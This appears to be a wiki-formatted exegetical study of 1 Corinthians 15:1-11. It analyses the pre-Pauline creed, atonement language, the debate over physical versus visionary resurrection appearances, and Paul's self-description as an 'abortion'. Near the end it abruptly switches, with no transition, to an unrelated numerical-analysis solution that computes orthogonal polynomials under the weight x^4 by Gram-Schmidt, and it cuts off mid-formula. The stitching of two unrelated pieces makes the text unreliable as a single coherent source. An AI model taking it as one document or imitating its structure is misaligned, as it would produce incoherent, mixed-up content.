First, the structure of this section of verses seems very formally set up and organized, with each line indicated by a the conjunction ότι (which means &quot;that&quot;) and the creed held together and progressively intensified with numerous repetitions of the conjunction καί (which means &quot;and&quot; or &quot;also&quot;) at the end of each line.&lt;ref&gt;Thiselton, 1189; Fee, 722-723.&lt;/ref&gt; When formatted to show its structure, it looks like this:

: That (ότι) Christ died for our sins, according to the Scriptures;
:: And (καί) that (ότι) he was buried;
:: And (καί) that (ότι) he was raised on the third day, according to the Scriptures;
: And (καί) that (ότι) he appeared to Cephas and then to the Twelve

Structurally, this does not seem like mere discourse as the free flow of Paul's thoughts, but rather a specific formulation. This is further supported by the chiasmus formed by active (lines one and four) and passive (lines two and three) verbs.&lt;ref&gt;Garland, 687.&lt;/ref&gt;

Further support for interpreting this as a creed is the presence of non-Pauline language, particularly the presence of &quot;for our sins.&quot; Collins reflects notes regarding this phrase in the creed: &quot;Apart from biblical citations and traditional formulae, Paul rarely uses sin in the plural. The notion of 'taking away sins' is generally absent from his theology.&quot;&lt;ref&gt;Collins, 534.&lt;/ref&gt;

From analyzing the language in the creed, some scholars have believed a place of origin can be derived. Collins asserts:

&lt;blockquote&gt;
Every element of the confession derives its meaning from Jewish apocalyptic thought: Christ, sins, scripture, resurrection, and the symbolic &quot;Twelve.&quot; An anarthrous &quot;Christ,&quot; the Aramaic &quot;Cephas,&quot; and the ''parallelismus membrorum'' point to its Palestinian origins.&lt;ref&gt;Collins, 531&lt;/ref&gt;
&lt;/blockquote&gt;

This understanding does appear to be accurate, though both Collins&lt;ref&gt;Collins, 531.&lt;/ref&gt; and Thiselton&lt;ref&gt;Thiselton, 1189.&lt;/ref&gt; note that the vocabulary does appear to be somewhat from a composite of Aramaic and Hellenistic-Jewish-Christian roots. Beyond its origins, the creed's traditional role can also be estimated. By its brevity and yet its comprehensiveness of the significance of the Christ story, it seems this creed was an attempt to capture the full Gospel message. Perhaps it was created in an attempt to shape Christians' identity as Christians so that it could be easily described across cultures and generations, much the same way the Shema functioned in Jewish practice and education. Furthermore, Collins points out that that the creed could well have been used in baptismal settings, citing the very similar language and pattern in Romans 6:3-4 and Colossians 2:12.

This interpretation of this section of verses as a traditional creed, though believed by this author to be the best interpretation, is not without contest. Notably, Garland asserts that, while the material lends itself to various traditions, it is ''not'' a creedal formulation of the early church. To support this, he rightly asserts that Paul uses the word &quot;sins&quot; elsewhere in Corinthians in 15:17, which is not believed to be a creed.&lt;ref&gt;Garland, 684.&lt;/ref&gt; He notes that Paul's use of &quot;the Twelve,&quot; which is not present in Paul anywhere else, simply shows that he is drawing from tradition, not quoting it.&lt;ref&gt;Garland, 688.&lt;/ref&gt; Nonetheless, while Garland does bring about some good points in showing that the text does not ''necessitate'' a creedal interpretation, it is still most likely that it is a creed. Furthermore, he does not provide any conclusive evidence as to why the verses must not be interpreted as such, only that there the support for interpreting it as a creed is debatable.

'''Line one''' of the creed begins the creed with Christ's death. As reflected in the translation given above and the accompanying translation note, the usage of the word υπέρ in this context necessitates some form of atonement theory. However, the form of atonement theory being expressed is debated. Fee asserts that &quot;for our sins&quot; directly references the Septuagintal Isaiah 53 in the and expresses an early form of penal satisfaction. He describes his understanding by saying:

&lt;blockquote&gt;
...the creed presupposes alienation between god and humans because of human rebellion and sinfulness, for which the just penalty is death. Death 'for our sins' means that one died on behalf of others to satisfy the penalty and to overcome alienation.&lt;ref&gt;Fee, 724.&lt;/ref&gt;
&lt;/blockquote&gt;

This interpretation, while thoroughly Protestant, reads far too much into the text and risks anachronism. While the text does indeed say that Christ died on behalf of others, there is no mention of the necessity of satisfying any penalty or overcoming alienation. Put simply, the only reason given in this creed for Christ's death is that it was necessary because of our sins. Thiselton describes, perhaps, a more moderate and sound interpretation of the atonement theory being expressed by the creed. He claims that the creed could be referring to Christ's death as an atonement offering or that of representation/substitution. Here, Thiselton opts of for a ''via media'' in suggesting perhaps it is a matter of both:

&lt;blockquote&gt;
Propitiation leads to disastrous distortion only if we fail to emphasize that God himself is the ''source'' of the action, not that Christ &quot;propitiates&quot; an angry and reluctant God. ''Expiation'' may be a &quot;safer&quot; term, but invites skepticism about the status of abstract principles of justice, as if God were tied by these, rather than recognizing that any notion of &quot;must suffer&quot; rests purely on divine self-consistency.&lt;ref&gt;Thiselton, 1191.&lt;/ref&gt;
&lt;/blockquote&gt;

Regardless, the best that can be definitely known for the atonement theory expressed in this passage is that Christ ''did'' atone. The creed seems to not express any concern for the ''how'' of this atonement, only that it did indeed happen once and for all.

&quot;According to the Scriptures&quot; has been variously interpreted. Garland, in what appears to be a minority opinion, interprets &quot;according to the Scriptures&quot; as causal: &quot;This death was not a sad misadventure but something God destined for him because of... the sins of humankind.&quot;&lt;ref&gt;Garland, 684.&lt;/ref&gt; While this is notable, it is also unlikely, and no other translation translates it as such. With Fee, it is much better to interpret &quot;according to the Scriptures&quot; as specifying fulfillment of the Old Testament canon as a whole.&lt;ref&gt;Fee, 727.&lt;/ref&gt; This likely points to a general expectation of the Jews, from reading their Scriptures, of an awaited messianic figure, rather than to any specific verses.

'''Line two''', describing Christ's postmortem burial, ultimately points the finality of Christ's death. It serves to span the time between death and resurrection.&lt;ref&gt;Garland, 686.&lt;/ref&gt; It is interesting to note that the passive voice of &quot;was buried&quot; points out that another acting party was responsible in burying him, humans (the very humans for whose sins he died in the previous line). After the death of Christ, humans put him in a sealed grave, seemingly conquering the &quot;King of the Jews.&quot; But the creed goes on.

'''Line three''', also in the passive voice, points to another external acting party. This time, however, it was not humans acting, but God. This is significant because the creed seems to implicitly say that, while humans brought him down, they--along with all the finitude of mortality--could not restrain the power of God. God proves Godself powerful over the powers of death. &quot;Christ was raised.&quot; This is significant for Paul's argument to follow, beginning in verse twelve. It is also important to note that Christ did not raise himself, but was raised by God.

As can be seen reflected in the translation above, the effects of Christ's resurrection were not confined to the past. As has been significant elsewhere in this passage, the creed makes use of the perfect tense for &quot;was raised,&quot; as opposed to the aorist tense (simple past) used in the previous lines of the creed. Thus, the creed is emphasizing that the death and burial of Christ were final and remain in the past--once-for-all. But the resurrection of Christ lasts onward--for God is eternally victorious over the power of death in Christ.&lt;ref&gt;Fee, 726.&lt;/ref&gt; It is thus reasonable to assume that, as a creed, this was a high-note for those reciting it, even before Paul, as the changed tense would have been obvious to the Greek speaker and hearer. Furthermore, it is also important for Paul's argument to follow, because Christ's resurrection would ''need'' to bring about effects for the Corinthians for Paul's argument to stand.

There has been some debate over whether &quot;according to the Scriptures&quot; refers specifically to the resurrection, or just to it being &quot;on the third day,&quot; or the whole phrase. The most credible interpretation, however, is on the last option.&lt;ref&gt;Garland, 687.&lt;/ref&gt; There is no delineation that makes the phrase point to anything other than the whole line within the text--which could have been accomplished with the linguistic tools available in Greek. Regarding which Scriptures are being referred to, many interpreters, both recent and ancient, have suggested Hosea 6:2 as being of particular reference (i.e. Pelagius,&lt;ref&gt;Bray, Gerald, Ed. ''First Corinthians''. Ancient Christian Commentary on Scripture. (Downers Grove: InterVarsity Press, 1999), 150.&lt;/ref&gt; Matthew Henry,&lt;ref&gt;Henry, Matthew. ''An Exposition, with Practical Observations, of the First Epistle of St. Paul to the Corinthians.'' Commentary on the Whole Bible (Unabridged). Vol. VI. (Public Domain, 1721), 1 Cor 15:1-11. ''Accordance Bible Software''. OakTree Software Inc. Version 8.2.2, Mar. 2009.&lt;/ref&gt; Garland&lt;ref&gt;Garland, 687.&lt;/ref&gt;). With this duly noted, it seems inconsistent to translate the previous &quot;according to the Scriptures&quot; as generally referring to the whole of the Scriptures, while interpreting this instance--exactly the same phrase, within the same creedal construction--in a different manner. It is most logical, then, to interpret this phrase in the same way as the previous one.

'''Line four''' of the creed is important in that it is what ultimately begins the church's witness of the resurrection, and verifies Christ's victory over the death. If Christ had ''not'' appeared to Cephas and the Twelve, then the resurrection would not have been known apart from empty tomb stories--which naturally lend themselves to the &quot;stolen body&quot; theory. &quot;Cephas&quot; is the Aramaic name for Peter. &quot;The Twelve&quot; is a phrase not used elsewhere by Paul (he prefers the word &quot;apostles&quot; instead). Some manuscripts actually change &quot;the Twelve&quot; to &quot;the Eleven,&quot; likely as an attempt to compensate for Judas not being able to have witnessed Christ's resurrection. But this is unnecessary, as the creed is referring to &quot;the Twelve&quot; as a title for a particular group of disciples, and not a number of disciples.&lt;ref&gt;Garland, 695.&lt;/ref&gt;

One of the most debated words in this creed is the word ώφθη, which literally means &quot;was seen.&quot; However, this word, in this inflected form, is frequently used in the Septuagint to refer to visible manifestations of God's Glory.&lt;ref&gt;Collins, 531.&lt;/ref&gt; Collins asserts, regarding this,

&lt;blockquote&gt;
The traditional Jewish understanding of divine transcendence, particularly strong at the time of Paul, suggests that the use of this traditional language with regard to a manifestation of the divine did not imply physical sight. In the biblical accounts of a manifestation of the divine, auditory elements predominate.&lt;ref&gt;Collins, 534.&lt;/ref&gt;
&lt;/blockquote&gt;

It seems Collins, then, joins the party of scholars who believe the term does ''not'' refer to physical sight. There is significant opposition to this stance, however. Both sides of the argument will be taken up and then evaluated in the &quot;reception&quot; section.

====More Tradition - Other Relevant Appearances of the ''Resurrected'' Christ: vv. 6-7====

Verses 6-7, it is generally agreed upon by scholars, return to Pauline content.&lt;ref&gt;Fee, 729.&lt;/ref&gt; Paul goes on in these verses to mention additional appearances of the resurrected Christ. These appearances seem to be drawing from various other traditions, which are not actually recorded elsewhere in Scripture. They are added here by Paul to show a continuation from creed to Apostolic witness--an essential connection if Paul is to firmly ground his following argument to come in the centrality of the resurrection in the Christian faith. It is more than simply the gospel message passed on in a brief creed, but it is agreed upon by many the people who the Corinthians know or of whom they have heard. Paul is still in the process of reminding, begun in verse one. Now, however, Paul is making the resurrection real, beyond story to unanimous agreement of people the Corinthians know and whose witness matters.

'''Verse six''' cites a resurrection appearance to the largest group cited in Scripture. As noted translation note 9, the meaning of &quot;brothers&quot; here is very hard to translate. Due to Paul's usage of it here in the context of mentioning witnesses, it is best to translate it most literally, though it should be noted that there were most likely many women who also viewed the resurrected Christ in this mass appearance.

An important detail of this verse to understand is the word εφάπαξ, which refers to action happening simultaneously, at the same time.&lt;ref&gt;Danker, 417.&lt;/ref&gt; This is pointed to frequently in the argument for the ''physical visibility'' of Christ's appearance. It is unlikely, so the argument goes, that ώφθη refers simply to a visionary experience in this chapter because such a mass-religious experience held by so many people would be one for the record books. It ''must'' then be in reference to Christ being physically present in front of these people.&lt;ref&gt;Garland, 689.&lt;/ref&gt; More will be discussed on this argument a little later in the &quot;reception&quot; section.

The second part of this verse describes the status of these five hundred &quot;brothers&quot;--most of them are still living, though some have &quot;fallen asleep.&quot; The phrase &quot;fallen asleep,&quot; is translated from the word εκοιμήθησαν. This word is often figuratively used to refer to dying.&lt;ref&gt;Coenen, Lothar. &quot;Κοιμάομαι / κοιμάω.&quot; ''The New International Dictionary of New Testament Theology.'' Colin Brown, Ed. Version 2.0. (Grand Rapids: Zondervan, 1986). ''Accordance Bible Software.'' OakTree Software, inc. Version 8.2.2, March 2009.&lt;/ref&gt; While some commentators (such as Collins&lt;ref&gt;Collins, 536.&lt;/ref&gt;) point to this phrase as direct support for Paul's usage of the word &quot;raised,&quot; which often is used to express being &quot;awakened,&quot; and thus serves to reinforce Paul's argument later on, this connection (if intended) can only be marginal, at best. The term us used figuratively frequently in Greek, even apart from any discussion whatsoever of resurrection.&lt;ref&gt;Danker, 551&lt;/ref&gt; To a culture accustomed to such a euphemism in speech, which also embraced the common grave inscription &quot;I was not, I was, I am not, I care not,&quot; &lt;ref&gt;Boring, Eugene et al. ''Hellenistic Commentary to the New Testament.'' (Nashville: Abingdon Press, 1995), 437.&lt;/ref&gt; such a connection would likely not be very persuasive.

There seems to be two possible loci of emphasis in this second part of the verse. Fee points out that Paul including this phrase functions as an invitation to the Corinthians to inquire for themselves about the objective reality of the resurrection, with a tinge of regret that some have already died.&lt;ref&gt;Fee, 730.&lt;/ref&gt; Garland, however, offers an alternative: Paul's focus in saying some are still alive (without actually naming any specific individuals) is on those who have fallen asleep, to show that the dead are indeed raised; &quot;Death precedes resurrection.&quot;&lt;ref&gt;Garland, 689-690.&lt;/ref&gt; As noted in the above paragraph, however, such a connection is difficult to make because such a nuanced and implicit implication would likely not have been caught by Paul's audience. In light of this, it seems Fee's interpretation is more likely.

'''Verse seven''' adds two more appearances to the list that Paul is heaping up, one after another. There is no specific indication given as to which James is being referred to here. However, it should be noted that (1) James of the Twelve had already been martyred by this time; (2) James the brother of Jesus, as leader of the church in Jerusalem, would have been likely known by the Corinthians, even if only by name; and (3) Paul's intention here is to list the ''major'' (i.e. &quot;big name&quot;) witnesses to the resurrected Christ to show its validity beyond the gospel story. Thus, given these premises, it seems James the brother of Jesus is most likely the James to which Paul refers.

The second part of verse seven refers to &quot;all the apostles.&quot; While exactly who &quot;all of the apostles&quot; are is not clear, and there is no mention of &quot;at one time&quot; as there was in verse six, a few important things can be noted from this. First, the &quot;apostolate&quot; to which he refers, categorically speaking, seems to be of a larger number than the Twelve.&lt;ref&gt;Collins, 536.&lt;/ref&gt; Thus, for Paul, &quot;the Twelve&quot; in verse five is not synonymous with the much more Pauline &quot;apostles.&quot; Furthermore, there were more than &quot;Twelve&quot; recognized apostles in the church. Second, the word order in the phrase puts the emphasis on the apostles, presence of the word &quot;all&quot; (πασίν).&lt;ref&gt;Thiselton, 1208.&lt;/ref&gt; This is significant in that it is easy to read the phrase and focus on how ''every'' apostle saw the resurrected Christ (which seems implausible)--but the emphasis on &quot;apostles&quot; could rectify this implausibility. Instead, perhaps Paul intends something like &quot;the whole apostolic body.&quot; If this were the case, then this would prove a perfect concluding transition to verse eight, where Paul shifts from the witness of the apostolate to his own personal experience. Thus, Paul would be concluding his additions to the creed essentially like so: &quot;Then he appeared to five hundred brothers... then to James, and finally to the whole apostolic body--''ask nearly anyone in the church, and you can be directed to an ''actual'' witness of our resurrected Lord!''&quot;

====Paul's Personal Experience of the Resurrection by Grace: vv. 8-11====

Typically, '''verse eight''' is included with vv. 6-7 as an additional resurrection appearance of Christ--and this it indeed is. Structurally, is looks just like the previous two verses, even using for the final time in the letter the word ώφθη (meaning &quot;he appeared&quot;), which had been present three other times from vv. 5-7. The reason why verse eight is included in this section, however, is for the significance Paul makes here. As noted earlier, Paul begins in verse one calling the Corinthians to remember the Gospel message he brought to them. It is contained within the creed he taught them, but also in the living witness of the apostles. Now, in vv. 8-11 eight, Paul shifts to show how this gospel message is something to which he can very personally attest, as his own radical calling experience (of which the Corinthians must have heard before from him) and his subsequent labors as an apostle show the truth of this Gospel.

Of particular significance in this verse is the word εκτρώματι, which has attracted much attention throughout the centuries. For a description of the meaning of this word, see translation note 10. There seem to be a few different camps who each argue for a different interpretation. The first camp (reflected in the translations of the NRSV, NASB, NET, and ESV, among others) understands this to simply mean being &quot;born&quot; at a chronologically bad time. The church father, Ambrosiaster, took this stance and believed it was in reference to Paul being the only apostle to be called after the ascension.&lt;ref&gt;Bray, 152.&lt;/ref&gt; However, this stance cannot be well supported, as the word is only used for births that are premature, not late.&lt;ref&gt;Garland, 693&lt;/ref&gt; Furthermore, there seems to be little relevance in Paul referring to the relative chronology of his calling compared to the other apostles--such has no effect on the Good News of the resurrection to the Corinthians.

Another camp interprets the word to mean something of an abortion (think &quot;aberration&quot;), &quot;freak,&quot; or monster. This is reflected in the NIV's &quot;as to one abnormally born.&quot; As noted in the historical context, some scholars consider the Corinthian church to have a rather low regard for Paul's apostolic authority. Thus they interpret the word εκτρώματι to refer to someone who is a dwarf compared to Apollos or Peter.&lt;ref&gt;Fee, 733.&lt;/ref&gt; This would be an insulting play on words in reference to Paul's name, which means &quot;small&quot; or &quot;little.&quot;&lt;ref&gt;&quot;Paul.&quot; ''Hitchcock's New and Complete Analysis of the Holy Bible.'' Version 1.2. (Public Domain). ''Accordance Bible Software.'' OakTree Software, Inc. Version 8.2.2. Mar. 2009.&lt;/ref&gt; Furthermore, this word could be Paul quoting the very insult flung at him--that he was an abortion. According to Collins, who takes this stance, the word has its origin

&lt;blockquote&gt;
...in a derisive epithet hurled at Paul by his opponents, perhaps mocking his claim that he, like the prophets of old, had been chosen by God from his mother's womb.&lt;ref&gt;Collins, 537.&lt;/ref&gt;
&lt;/blockquote&gt;

While this interpretation is indeed possible, it seems hardly plausible, given there is a better explanation (below) that does not require formulating fictitious background stories in the light of which to understand the present text. Simply by looking at the text we have available to us, the following interpretation seems to function best.

A third major camp of interpretation sees εκτρώματι as referring to the ''nature'' of Paul's calling experience, rather than the ''chronology''. This camp believes there is no legitimate reason to believe that the term is a quoted insult unless one fabricates a story to explain one's interpretation. Commenting on Collins' interpretation, Garland asserts:

&lt;blockquote&gt;
...there is no evidence that this term was used as an epithet agaisnt Paul or any evidence in this letter that the Corinthinans viewed his apostleship as somehow abortive, monstrous, or demonic. The simplest explanation is that it is Paul's own description of his calling as an apostle.&lt;ref&gt;Garland, 691.&lt;/ref&gt;
&lt;/blockquote&gt;

It is highly probable that Paul here is indeed referring to his calling experience, as that interpretation best serves to support that which follows. But what sort of nature is Paul referring to? That of a stillborn child that has no possibility of life apart from some sort of divine intervention. Paul, in recollecting his personal experience of the resurrected Christ, shows a sort of absolute disgust with the state in which he existed prior to it. He ''persecuted the church''. Paul was altogether hopeless in his wretchedness--as full of life and potential as an aborted or miscarried fetus.&lt;ref&gt;Garland, 693.&lt;/ref&gt; As noted by Thiselton, who ultimately takes this side, Paul's focus in this statement is not on himself, but rather on the grace of God, &quot;who chooses to give life and new creation to those reckoned as dead, or, in Paul's case, both a miscarried, aborted foetus whose stance had been ''hostile'' to Christ and to the new people of God.&quot;&lt;ref&gt;Thiselton, 1208.&lt;/ref&gt;

Thiselton in the above quote hints at the possible connection between verse eight and the previous creed. The pattern of the creed is death, finalized by burial, then life, enacted by God and witnessed by the church. Here, too, Paul gives a pattern: death (although technically still alive), with no hope of life to be found, then life, enacted by God and laboring for the church as an apostle. The pattern is strikingly similar.

'''Verse nine''' continues Paul's discourse on Christ's gracious calling. Paul puts it quite plainly: the apostolic position he holds now has nothing to do with anything he earned. He is the least of all the apostles. Fee, here, seems to misunderstand the nature of Paul's statement here. Due to his belief that Paul is defending his apostolic status to his critics, he believes that Paul says this to assert that, although Paul is the least of the apostles, he still ''is'' an apostle.&lt;ref&gt;Fee, 734.&lt;/ref&gt; But this interpretation seems inadequate; this section of verses does not at all sound remotely like a stern lecture on why his position must be respected. Rather, as previously noted, it seems his focus is entirely on the power of God's grace though the resurrection.

Verses 8-9 show Paul's belief in his absolute inadequacy to be who he is. He was hopelessly and miserably lost. If ever there was a soul who would gladly sing the old church hymn, it would be Paul:

&lt;blockquote&gt;
Amazing Grace! How sweet the sound,
that saved a wretch [i.e. an abortion] like me!
I once was lost but now am found,
was blind but now I see.
&lt;/blockquote&gt;

Paul was not worthy--he persecuted the church of God. The word he uses here for &quot;church&quot; is εκκλησίαν, which has two roots: εκ (a preposition connoting motion outward) and καλέω (a verb, meaning &quot;to call&quot;).&lt;ref&gt;Danker, 303.&lt;/ref&gt; It is important to see in this that Paul, talking about his persecution of the &quot;called out ones of God,&quot; is not speaking of the church as an organizational institution as it is commonly thought to mean today. Rather, Paul is talking about the very gathering of ''people''--the very ones for whom God has given him a deep love--who he persecuted. The gravity of this verse, combined with the graphic visual image in verse eight, is heavy enough to bear down even the strongest of constitutions. This is the very depth of death Paul is referring to when he speaks of death, which can still be had in the course of biological life.

This somber dirge, however, changes to a triumphant anthem, however, in '''verse ten''. This verse is powerful and one can imagine the force with which Paul utters these words: &quot;But by the grace of God I am what I am, and his grace unto me has not come to be fruitless...&quot; Paul, here, rises out of the depths of death and is able to speak of his abundant life he now has in Christ.

It needs to be noted that Paul does ''not'' say in this verse &quot;I am who I am,&quot; which would reflect God's work on Paul's character and personality. Instead, what Paul has to say is far more profound; he uses the neuter relative pronoun ό, which makes the translated phase say &quot;I am ''what'' I am.&quot; Paul is not just referring to the characteristics of his humanity, but rather whole nature and status as a being. The juxtaposition Paul provides is not between &quot;the worse me&quot; and &quot;a better me,&quot; but rather between two different beings: the first an abortion, unable to live, hopelessly lost to God, persecuting the people of God, and the second an ''apostle'' of the church who has labored for the church more than all the rest. It is no between &quot;the worse me&quot; and &quot;a better me,&quot; but rather &quot;the old self&quot; and the &quot;new creation.&quot; And, as is significant contextually, this transformation was triggered by ''the resurrection appearance of the Christ to Paul''.

As a side note, it must be said that in Paul asserting that he has labored more than all the rest of the apostles, he is ''not'' asserting himself over anyone. Rather, it is necessary for Paul to be able to point to the actual fruit of God's grace in his life--not to show how great he is, but rather the limitless greatness of God's grace. Thus Paul, always careful to ''only'' &quot;boast in the Lord,&quot; immediately clarifies the source of the his surpassing labors: God's grace.

Paul's point in what seems to be a very personal digression is actually Paul's final witness of the resurrection. The Corinthians have heard the creed. There is an abundance of witnesses in the Church who can attest to its historicity. And lastly, Paul can say that he did indeed also see the resurrected Christ. And if they don't believe his testimony, all they need to do is look at his history; in the timeline of Paul's life, there is a definite point in it where the course of Paul's life is radically changed, to move him in such a radically different direction in his life that it would take something as drastic as the bodily appearance of the resurrected Christ to have caused it. Indeed, the Corinthian church owes its very existence to this resurrection event, as Paul &quot;planted&quot; the community (see 3:6).

It is on this note that Paul concludes in '''verse eleven''' his foundation upon which his following argument will be built. Paul's statement in this verse is concluding in nature due to the presence of ούν, which means &quot;therefore&quot; and which functions to gather the preceding information and tie it together to introduce a result or inference.&lt;ref&gt;Danker, 736.&lt;/ref&gt; This coordinating conjunction, then, refers to the preceding material, most likely vv. 3-10, and ushers in the conclusion: Regardless of where they look within the church, the bodily resurrection of Christ can be witnessed in the gospel message, via the witness of the apostles, and in Paul's very life. Therefore, wherever they go, if the Corinthian church is at all Christian, then the resurrection of Christ is something they must absolutely embrace.

===Implications===

====Reception====

=====Were Christ's Resurrection Appearances Physical or Visionary in Nature?=====

As noted above regarding '''vv. 5-7''', there is much debate as to the nature of the resurrection. Some of the debate of both sides has already been mentioned, but further comment is necessary. The primary support given to the side that argues the text does ''not'' refer to a ''bodily'' resurrection is the word ώφθη, which is frequently used in Jewish sources to refer technically to divine manifestations that were rarely, if ever, physical in nature.

There is indeed a hole in this reasoning however: Paul's audience. The Corinthian church was mainly Gentile in nature. Paul making use of a term that would only be familiar to a Jewish audience to describe a divine, visionary manifestation in order to communicate with Greeks who had had little to no exposure to the Septuagint would poor contextualization on Paul's part. Considering Paul's calling and life profession was in living as a missionary to the gentiles, such poor a choice of words would seem unlike him.

Furthermore, when the word ώφθη is translated literally, without further assumptions of background meaning, the word means &quot;was seen.&quot; Fee points out that this is pivotal to Paul's argument. If the resurrection was spiritual in nature only, Paul would have no basis for arguing for the bodily resurrection of believers in the following section of text.&lt;ref&gt;Fee, 728&lt;/ref&gt; It would make little sense. Instead, to take the word literally implies the use of eyes to physically see the Christ. Thisleton further removes credibility from this argument by noting that Romans 15:21 contrasts seeing with the eyes (making use of όψονται, which is a variation of ώφθη) and seeing with the mind/understanding (which uses a completely different verb).&lt;ref&gt;Thiselton, 1198.&lt;/ref&gt;

While proper credence should be given to the arguments of those who oppose an interpretation of bodily resurrection, it appears as if such arguments are driven more by post-historical-critical existentialist biases. The opponents seem to not believe in an objective resurrection, and thus interpret Scripture as such, choosing instead to find a subjective meaning and truth for life in the idea of the resurrection. Thiselton cites two notable figures who fall into these categories. The first is W. Marxsen, who he describes as saying:

&lt;blockquote&gt;
...we must abandon talk about &quot;an objective vision&quot;; or at least accept that the weight is placed on &quot;the subjectivity...of my own faith,&quot; although certainly with the fundamental proviso that for Paul (or Peter) &quot;the impulse to faith came from outside himself.&quot;&lt;ref&gt;Thiselton, 1200.&lt;/ref&gt;
&lt;/blockquote&gt;

The second figure Thiselton cites is Rudolf Bultmann, who went even farther and asserted that &quot;belief in the resurrection is 'the same thing as faith in the saving efficacy of the cross.'&quot;&lt;ref&gt;Thiselton, 1201.&lt;/ref&gt;

As noted earlier, however, these things ''cannot'' be Paul's argument here in the text, as that would have destroyed Paul's point, not assisted it.

Furthermore, it is relevant to note four points that theologian Wolfhart Pannenberg makes to fend of solely existential interpretations of the resurrection. He asserts that it is intellectually credible--indeed, more credible--to believe in the bodily resurrection of the Christ:

# The early Christian witness could not have been nearly as successful as it was if Christ's body was still within the tomb while they were preaching his resurrection. Thus it is necessary to assume that the tomb was indeed empty.
# The empty tomb, by itself, could be explained in other ways that would not necessitate resurrection. Perhaps this is why Paul does not once refer to an empty tomb.
# When premises 1 and 2 are combined, it is difficult to assume that so many witnesses were merely hallucinating.
# To assert that an event took place between burial and the visit of the women to the empty tomb is a ''historical'' claim and can thus be tested and analyzed. Thus, based upon the biblical witness, one cannot come to a solely existential conclusion regarding the meaning of the resurrection.&lt;ref&gt;Thiselton, 1197-1198.&lt;/ref&gt;

Therefore, based upon this evaluation, it seems nearly impossible for one to deny Christ's bodily resurrection. As Tertullian puts it in a discourse against Marcion:

&lt;blockquote&gt;
For just as they, who said that there is no resurrection of the dead, are refuted by the apostle from the resurrection of Christ, so, if the resurrection of Christ falls to the ground, the resurrection of the dead is also swept away. And so our faith is in vain, and vain also is the preaching of the apostles. Moreover, they even show themselves to be false witnesses of God, because they testified that he raised up Christ, whom he did not raise. And we remain in our sins still. And those who have slept in Christ have perished; destined, forsooth, to rise again, but peradventure in a phantom state, just like Christ.&lt;ref&gt;Tertullian. ''The Five Books Against Marcion.'' The Ante-Nicene Fathers. S. Thelwall, Trans. Alexander Roberts and James Donaldson, Eds. Vol. 3. Version 2.0. (Public Domain), 3:8. ''Accordance Bible Software''. OakTree Software, inc. Version 8.2.2. Mar. 2009.&lt;/ref&gt;
&lt;/blockquote&gt;

Of particular note in this quote by the great church patriarch, the resurrection of Christ is especially relevant for how one lives life as a Christian (if one could even be a Christian without Christ's resurrection). He seems to say that without the new life that is only provided by Christ's resurrection, we cannot possibly be new creations--&quot;we remain in our sins still.&quot; If Christ was not actually resurrected, then Paul is still an εκτρώμα, an aborted fetus. But this certainly does not explain the radical change in Paul's life. In short, without Christ's resurrection in reality, ''in history'', the church has no purpose and the Christian faith is simply a philosophy.

====Influence====

=====Paul's Ministry as a Relevant Paradigm for Today=====

There can be no doubt that &quot;grace&quot; is an important theme in Paul's writings. This should be understood as having particular relevance to the way in which ministers today go about their &quot;labors.&quot; Paul's description of his apostolate here, then, needs to be a paradigmatic understanding as part of any minister's philosophy of ministry.

This emulation of Paul's ministry--even language--is not a new notion in the church. Indeed, Ignatius in his epistle to Rome has a phrase that is strikingly similar to what can be seen in '''vv. 8-10''':

&lt;blockquote&gt;
But as for me, I am ashamed to be counted one of them; for indeed I am not worthy, as being the vary last of them, and one born out of due time. But I have obtained mercy to be somebody, if I shall attain to God.&lt;ref&gt;Ignatius. &quot;The Epistle of Ignatius to the Romans.&quot; ''The Apostolic Fathers With Justin Martyr and Irenaeus.'' The Ante-Nicene Fathers. Alexander Roberts and James Donaldson, Eds. Vol. 1. Version 2.0. (Public Domain), 10. ''Accordance Bible Software''. OakTree Software, inc. Version 8.2.2. Mar. 2009.&lt;/ref&gt;
&lt;/blockquote&gt;

It is highly unlikely that this quotation is coincidentally similar to Paul's description of his own calling in vv. 8-10. Ignatius seems to be drawing from the Pauline wellspring for guidance as to how to be a minister.

But what exactly can we learn from Paul's description here? Perhaps most important verse is '''verse ten''': &quot;But by the grace of God I am what I am, and his grace unto me has not come to be fruitless; Rather, I toiled harder than all of them, yet it was not I but the grace of God working with me.&quot; 

If one is to take the biblical doctrine of the &quot;new creation&quot; seriously--that there an ontological transformation (otherwise known as sanctification) in the regenerate (born again) Christian--then one must always acknowledge the true source of new life: the salvific work of Jesus Christ. It is only by the grace of God--the very empowering presence of God--that both Paul and the church today can truly ''be'' the church, a &quot;nation of priests.&quot; Indeed, this grace was not earned--for that is contrary to the very nature of grace. Augustine describes it well: &quot;Paul did not labor in order to receive grace, but he received grace so that he might labor.&quot;&lt;ref&gt;Bray, 152.&lt;/ref&gt;

Beyond simply our very nature, our ministry needs to be understood in light of the grace of God. Paul does not once say that his actions stand apart unto themselves--the are only ever enabled by the grace of God working within him. Apart from this grace, he is nothing but an aborted fetus; with this grace, it is the greatest of apostles to whom the Church is indebted for his writings it has identified as Scripture. It is the same with our ministry--it is only by the grace of God that ministry is even possible.

==Solution 1==

===Find Orthogonal Polynomials w.r.t. Weighting Function===
For this problem, we need the first three orthogonal polynomials &lt;math&gt;P_1,P_2,\mbox{ and }P_3 \!\,&lt;/math&gt; with respect to a weighted inner product

:&lt;math&gt; \left \langle f,g \right \rangle = \int_{-1}^1 f(x)g(x)w(x) dx \!\,&lt;/math&gt;

where &lt;math&gt;w(x) = x^4 \!\,&lt;/math&gt; in our case. This can be done using Gram-Schmidt Orthogonalization on the basis &lt;math&gt;\left \{ 1,x,x^2,x^3 \right \} \!\,&lt;/math&gt; 

====Zero Order Polynomial====
Let &lt;math&gt;P_0(x) = 1 \!\,&lt;/math&gt;

====First Order Polynomial====
&lt;math&gt;
\begin{align}
P_1(x) &amp;= x - \frac{\left \langle 1,x \right \rangle}{\left \langle 1,1 \right \rangle}\cdot 1 \\
       &amp;= x - \underbrace{\frac{\int_{-1}^1 x^5 dx}{\int_{-1}^1 x^4 dx}}_{\frac{0}{2/5}}       \\
       &amp;= x
\end{align}
&lt;/math&gt;

====Second Order Polynomial====
&lt;math&gt;
\begin{align}
P_2(x) &amp;= x^2 - \frac{\left \langle 1,x^2 \right \rangle}{\left \langle 1,1 \right \rangle}\cdot 1 
              - \frac{\left \langle x,x^2 \right \rangle}{\left \langle x,x \right \rangle}\cdot x \\
       &amp;= x^2 - \frac{\int_{-1}^1 x^6 dx}{\int_{-1}^1 x^4 dx}
              - x \cdot \underbrace{\frac{\int_{-1}^1 x^7 dx}{\int_{-1}^1 x^6 dx}}_{\frac{0}{2/7}} \\
